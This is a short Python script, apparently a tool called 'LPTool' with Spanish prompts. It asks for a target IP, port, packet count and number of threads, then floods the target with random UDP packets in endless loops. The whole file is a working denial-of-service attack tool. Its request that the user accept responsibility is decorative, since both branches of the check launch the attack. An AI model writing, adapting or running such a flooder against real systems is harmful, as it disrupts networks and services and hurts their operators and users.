import random
import socket
import threading

ip = str(input("[LPTool] IP - "))
puerto = int(input("[LPTool] Puerto - "))
times = int(input("[LPTool] Paquetes - "))
threads = int(input("[LPTool] Conexiones - "))
choice = str(input("[LPTool] El ataque es bajo tu responsabilidad, estas de acuerdo?: "))
def udpddos():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(puerto))
			for x in range(times):
				s.sendto(data,addr)
			print("[LPTool] Ataque exitoso")
		except:
			print("[LPTool] Algun error ha ocurrido, revise el codigo!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = udpddos)
		th.start()
	else:
		th = threading.Thread(target = udpddos)
		th.start()
